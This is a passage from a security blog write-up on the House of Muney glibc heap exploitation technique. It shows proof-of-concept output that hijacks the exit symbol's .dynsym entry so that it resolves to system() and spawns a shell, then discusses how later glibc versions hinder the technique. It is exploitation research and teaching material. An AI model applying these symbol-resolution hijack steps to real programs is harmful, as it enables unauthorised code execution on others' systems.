+[*] [HIIJACK] Overwrite st_value in the 'exit' symbol table with offset of system func call
+[+] exit@dynsym → system()
+
+[!] Now the exit .dynsym table structures as:
+
+    typedef struct {
+        uint32_t st_name;     // Offset into .dynstr   - 0: 0x2efb
+        uint8_t  st_info;     // Type and binding      - 4: 0x12
+        uint8_t  st_other;    // Visibility            - 5: 0x00
+        uint16_t st_shndx;    // Section index         - 6: 0x000f
+        uint64_t st_value;    // Resolved address      - 8: 0x0000000000052290
+        uint64_t st_size;     // Size of the object    - 16: 0x20
+    } Elf64_Sym;
+
+[*] Step 9: Trigger symbol resolution for hijacked function
+[✓] Calling exit("/bin/sh") → now system("/bin/sh")
+
+$ id
+uid=1000(axura) gid=1000(axura) groups=1000(axura)
+
+Pwned:
+
+Challenges
+
+Libc Changes
+
+Why Use glibc 2.31?
+
+We targeted glibc 2.31 in our House of Muney exploit for a simple reason: it's one of the last glibc versions where the memory layout naturally aligns with the exploit's requirements.
+
+Key Observations Across Versions:
+
+glibc 2.31 :
+
+mmaped chunks are adjacent to the base of the libc mapping , allowing direct overwrite of
+.gnu.hash,
+.dynsym, or
+link_mapfields.
+
+glibc 2.34 :
+An anonymous
+[anon]region (~
+0x1000) is inserted between
+mmaped memory and the libc base .
+
+While this adds a barrier, it's still possible to
+munmap()the region and reclaim it , creating an overlap with libc.
+
+glibc 2.35 and later :
+A 3-page guard region (
+0x3000) is deliberately inserted before the start of the libc mapping.
+
+When
+munmap()is called to return the
+mmaped chunk back to the system, the freed memory is often dereferenced shortly after , during the return path of:
+free() → munmap_chunk() → __munmap().
+
+This triggers a segmentation fault not inside
+__munmap(), but when returning to
+free()— because glibc attempts to access thread-local or internal data (e.g., via
+fs-based pointers) that now point into unmapped memory .
+
+Attempts to
+munmap()this region result in segmentation faults .
+
+This behavior has been observed especially in glibc ≥ 2.35 , where certain memory regions near the libc base contain critical metadata (e.g., TLS descriptors, arenas) that cannot be unmapped without breaking the runtime.
+
+Side Effects
+
+Per my observation, starting from glibc 2.34 ,
+libdl.sowas merged into
+libc.so.6:
+
+$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep ' dlopen'
+
+0000000000090680 T dlopen@GLIBC_2.2.5
+0000000000090680 T dlopen@@GLIBC_2.34
+
+This change increases the amount of internal loader metadata living inside libc, including structures previously isolated.
+
+As a result, calls to
+mmap,
+dlopen, etc., implicitly allocate memory for:
+
+.dynsym,
+.gnu.hash,
+.got.plt
+
+TLS regions
+
+If this memory is
+free()d, the internal structures that still reference it (via
+fs,
+main_arena, etc.) will cause a segfault when accessed post-unmapping .
+
+Final Thoughts
+
+Despite these hardenings, the core idea of House of Muney remains potent:
+
+If a region adjacent to the libc mapping can still be
+mmap()ed — or reclaimed via
+munmap()followed by controlled reuse,
+
+Or if we can safely invoke
+mprotect()to lift restrictions on originally read-only mappings (e.g., through anonymous remapping or copy-on-write behavior),
+
+Then we can precisely poison resolution structures (
+l_info,
+l_gnu_buckets,
+dynsym, etc.),
+
+Which means symbol resolution can still be hijacked at runtime , redirecting control flow without traditional code execution primitives.
+
+So while the house may be boarded up , it's not demolished .
+
+House of Muney lives on in the ruins — under the right light, the door is still there.
+
+Reference
+
+https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation
+
+https://www.roderickchan.cn/zh-cn/2022-06-18-glibcheap-house-of-muney
+
+Attribution-NonCommercial-ShareAlike 4.0 International
+Code-C PoC-C Pwn-Dynamic Linking Pwn-ELF Pwn-FSOP Pwn-glibc Pwn-GNU Hash Pwn-Heap Exploitation Pwn-House Of Pwn-Mmap Pwn-Symbol Resolution Rev-libc Tool-Readelf
+0
+
+Previous Post
+
+HTB Writeup – Planning
+
+Next Post
+
+HTB Writeup – Puppy
+
+Author
+Axura
+
+#define LABYRINTH (void *)alloc_page(GFP_ATOMIC)
+
+View comments - 2 comments
+
+Comments | 2 comments
+
+Blogger iyheart
+Reply
+
+Posted on 2025-07-13 07:40
+
+Your blog is very good，I will learn house-of-muney from this blog.
+
+Blogger Nawar
+Reply
+
+Posted on 2025-08-17 15:08
+
+What is the password for writeup?
+
+Cancel Reply
+
+Markdown Supported while Forbidden
+
+I am watching you ... ...
+
+Click me OωO Woooooow ヾ(≧∇≦*)ゝ
+
+Biubiubiu (=・ω・=) Emoji
+
+(⌒▽⌒) （￣▽￣） (=・ω・=) (｀・ω・´) (〜￣△￣)〜 (･∀･) (°∀°)ﾉ (￣3￣) ╮(￣▽￣)╭ (´_ゝ｀) ←_← →_→ (<_<) (>_>) (;¬_¬) ("▔□▔)/ (ﾟДﾟ≡ﾟдﾟ)!? Σ(ﾟдﾟ;) Σ(￣□￣||) (’；ω；‘) （/TДT)/ (^・ω・^ ) (｡･ω･｡) (●￣(ｴ)￣●) ε=ε=(ノ≧∇≦)ノ (’･_･‘) (-_-#) （￣へ￣） (￣ε(#￣)Σ ヽ(‘Д’)ﾉ （#-_-)┯━┯ (╯°口°)╯(┴—┴ ←◡← ( ♥д♥) _(:3」∠)_ Σ>―(〃°ω°〃)♡→ ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄ (╬ﾟдﾟ)▄︻┻┳═一 ･*･:≡( ε:) (笑) (汗) (泣) (苦笑)
+
+Auto pull nickname and avatar
+You will receive notification by email
+Advertisement is forbidden 😀 I'm not a robot
+Save my name, email, and website in this browser for the next time I comment.
+
+Esse, Non Videri
+
+Binex
+Heap
+
+Stack
+
+Fuzzing
+
+Glibc
+
+Kernel
+
+Qemu
+
+WEB
+
+Writeups
+HTB
+
+CTFs
+
+Hacktag
+
+What are you looking for?
+
+CURSOR: NEON DAY | NIGHT
+
+DAY
+
+NIGHT
+
+Serif Sans Serif 
